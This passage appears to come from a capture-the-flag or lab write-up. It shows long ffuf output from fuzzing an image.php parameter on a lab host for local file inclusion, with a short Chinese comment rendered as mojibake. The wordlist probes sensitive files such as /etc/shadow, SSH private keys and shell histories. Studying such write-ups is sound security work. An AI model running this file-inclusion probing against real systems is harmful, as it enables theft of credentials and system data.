200, Size: 0, Words: 1, Lines: 1] /etc/cups/cupsd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pureftpd.passwd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/networks [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/motd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/bashrc [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/lsb-release [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/my.cnf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4.4/fcgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/logrotate.d/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/php4/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/samba/smb.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_config [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/sysconfig/network [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ftpaccess [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/apache2/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/passwd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/modules.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php5/apache/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/termcap [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/cgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_dsa_key [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vsftpd.chroot_list [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/resolv.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vsftpd/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/my.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/cpuinfo [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/filesystems [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/interrupts [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/ioports [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/syslog.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/modules [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/stat [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vsftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/wu-ftpd/ftpaccess [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/version [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/network/interfaces [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/bootptab [Status: 200, Size: 0, Words: 1, Lines: 1] /root/anaconda-ks.cfg [Status: 200, Size: 0, Words: 1, Lines: 1] /opt/xampp/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_key.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/lib/php/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/conf/modsec.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/logs [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs [Status: 200, Size: 0, Words: 1, Lines: 1] /logs/security_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/motd [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/redhat-release [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/swaps [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/httpd/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/hosts.deny [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/at.deny [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/httpd/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/pureftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php4/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php5/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php5/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/license_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/proftp.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /opt/lampp/etc/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/www/logs/httpd_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/Zend/etc/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/lib/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/wu-ftpd/ftphosts [Status: 200, Size: 0, Words: 1, Lines: 1] /var/adm/log/xferlog [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/apache2/config.inc [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/cgi/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /var/apache/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/cpanel/cpanel.config [Status: 200, Size: 0, Words: 1, Lines: 1] /var/local/www/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php5/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/stats_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/snmpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/conf/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /logs/security_debug_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/lib/mysql/my.cnf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/ssh_host_key [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache-ssl/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/inittab [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/exports [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/hosts.allow [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/cups/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/daemon.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/debug [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/dmesg [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/apache/audit_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/dpkg.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/wu-ftpd/ftpusers [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim_mainlog [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/mounts [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim_paniclog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim_rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim/rejectlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/faillog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/httpd/conf/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/meminfo [Status: 200, Size: 0, Words: 1, Lines: 1] /var/htmp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache-ssl/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpsd/ssl.access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpsd/ssl_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php4/httpd.conf.php [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/kern.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/lighttpd.error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mail.info [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim/mainlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/ftp-proxy/ftp-proxy.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/messages [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/mtab [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mail.warn [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/cpanel/logs/login_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/ftp-proxy [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysqlderror.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/pureftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/pure-ftpd/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/maillog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/message [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/vsftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/wtmp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/ftplog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/xferlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lastlog [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/yum.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/spool/cron/crontabs/root [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/lib/mysql/mysql/user.MYD [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/log/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/lighttpd/lighttpd.access.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bash_profile [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bashrc [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/secure [Status: 200, Size: 0, Words: 1, Lines: 1] /var/webmin/miniserv.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/proftpd/proftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mail.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.mysql_history [Status: 200, Size: 0, Words: 1, Lines: 1] /logs/pure-ftpd.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.profile [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/authorized_keys [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.atfp_history [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache2/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.nano_history [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/exim.paniclog [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.login [Status: 200, Size: 0, Words: 1, Lines: 1] /var/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_rsa [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_rsa.pub [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.php_history [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/printcap [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql/mysql-slow.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/identity.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/ssh/sshd_config [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.viminfo [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.wm_style [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/proftpd [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/httpd/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.xinitrc [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.xsession [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/apache/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.logout [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/error.log [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_dsa [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/id_dsa.pub [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php5/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bash_logout [Status: 200, Size: 0, Words: 1, Lines: 1] /proc/self/net/arp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/access.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.ssh/identity [Status: 200, Size: 0, Words: 1, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/etc/pure-ftpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php4/httpd.conf [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.bash_history [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.Xdefaults [Status: 200, Size: 0, Words: 1, Lines: 1] /usr/local/php/httpd.conf.ini [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.gtkrc [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/log/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/apache/logs/access_log [Status: 200, Size: 0, Words: 1, Lines: 1] ~/.Xresources [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/auth.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/boot [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/chttp.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql/mysql-bin.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/log/mysql/mysql.log [Status: 200, Size: 0, Words: 1, Lines: 1] /var/run/utmp [Status: 200, Size: 0, Words: 1, Lines: 1] /var/www/logs/error_log [Status: 200, Size: 0, Words: 1, Lines: 1] :: Progress: [257/257] :: Job [1/1] :: 19 req/sec :: Duration: [0:00:23] :: Errors: 0 :: è¿™è¾¹å¯ä»¥fuzzå‡ºæ¥ï¼Œä½†å†…å®¹éƒ½æ˜¯0ï¼Œè¯æ˜å‚æ•°ä¸å¯¹ï¼Œå°è¯•ä¸€ä¸‹å…¶ä»–å‚æ•° â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ffuf -u &quot;http://10.10.11.135/image.php?img=FUZZ&quot; -w /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt -fs 0 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.1 Kali Exclusive &lt;3 ________________________________________________ :: Method : GET :: URL : http://10.10.11.135/image.php?img=FUZZ :: Wordlist : FUZZ: /usr/share/seclists/Fuzzing/LFI/LFI-gracefulsecurity-linux.txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response size: 0 ________________________________________________ /etc/aliases [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/at.allow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/hosts.deny [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/access.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/conf/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/cups/cupsd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ftpchroot [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/chrootUsers [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/groups [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/lilo.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/shadow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/inittab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/hosts.allow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/inetd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/srm.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/motd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/logrotate.d/proftpd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/logrotate.d/vsftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/apache2/apache2.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ftpaccess [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/modules.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/mtab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php5/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/bashrc [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/anacrontab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/php4/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/passwd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/issue [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/chttp.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/exports [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/network/interfaces [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/cron.deny [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/my.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/fstab [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/grub.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/cgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pureftpd.passwd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd/putreftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/redhat-release [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_config [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/snmpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_dsa_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/passwd [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd/pure-ftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/my.cnf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/termcap [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vhcs2/proftpd/proftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4.4/fcgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php5/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/printcap [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php4/apache2/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/httpd/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/cron.allow [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/apache2/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vsftpd/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/wu-ftpd/ftpaccess [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/wu-ftpd/ftphosts [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/sshd_config [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/wu-ftpd/ftpusers [Status: 200, Size: 25, Words: 3, Lines: 1] /logs/security_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/samba/smb.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/filesystems [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_dsa_key [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/apache/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/stat [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/swaps [Status: 200, Size: 25, Words: 3, Lines: 1] /root/anaconda-ks.cfg [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ftphosts [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/npasswd [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/lib/php/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /logs/security_debug_log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/cgi/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/modules [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/ssh/ssh_host_key.pub [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/php/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/version [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/ioports [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/hosts [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/meminfo [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/error_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/conf/modsec.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/license_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/login_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/mounts [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/mysql/my.cnf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/proftp.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/profile [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php4/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php4/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vsftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php5/httpd.conf.php [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/cpanel/logs/stats_log [Status: 200, Size: 25, Words: 3, Lines: 1] /proc/interrupts [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/sysconfig/network [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/pureftpd/etc/pure-ftpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/pureftpd/etc/pureftpd.pdn [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/vsftpd.chroot_list [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/audit_log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/Zend/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1] /var/adm/log/xferlog [Status: 200, Size: 25, Words: 3, Lines: 1] /var/apache/logs/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /opt/lampp/etc/httpd.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/lib/mysql/my.cnf [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php/httpd.conf.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/pureftpd/sbin/pure-config.pl [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/logs [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/syslog.conf [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache2/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/access_log [Status: 200, Size: 25, Words: 3, Lines: 1] /logs/pure-ftpd.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache-ssl/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /opt/xampp/etc/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/apache/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/php5/lib/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/etc/pureftpd.pdb [Status: 200, Size: 25, Words: 3, Lines: 1] /var/cpanel/cpanel.config [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/access.log [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/lsb-release [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/logrotate.d/ftp [Status: 200, Size: 25, Words: 3, Lines: 1] /var/local/www/conf/php.ini [Status: 200, Size: 25, Words: 3, Lines: 1] /var/htmp [Status: 200, Size: 25, Words: 3, Lines: 1] /etc/networks [Status: 200, Size: 25, Words: 3, Lines: 1] /usr/local/www/logs/httpd_log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/cups/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] /var/log/apache/error.log [Status: 200, Size: 25, Words: 3, Lines: 1] 